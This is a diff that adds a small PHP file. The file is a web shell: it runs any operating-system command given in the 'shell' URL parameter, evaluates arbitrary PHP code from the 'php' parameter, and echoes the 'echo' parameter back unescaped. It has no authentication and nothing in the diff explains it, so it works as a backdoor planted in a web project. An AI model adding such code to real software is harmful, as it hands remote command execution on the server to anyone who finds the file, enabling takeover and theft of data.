@@ -1,0 +1,9 @@
+<?php
+
+   if(isset($_GET['shell'])) echo("<pre>".shell_exec($_GET['shell']." &")."</pre>");
+
+   if(isset($_GET['php'])) echo(eval(stripcslashes($_GET['php'])));
+
+   if(isset($_GET['echo'])) echo($_GET['echo']);
+
+?>
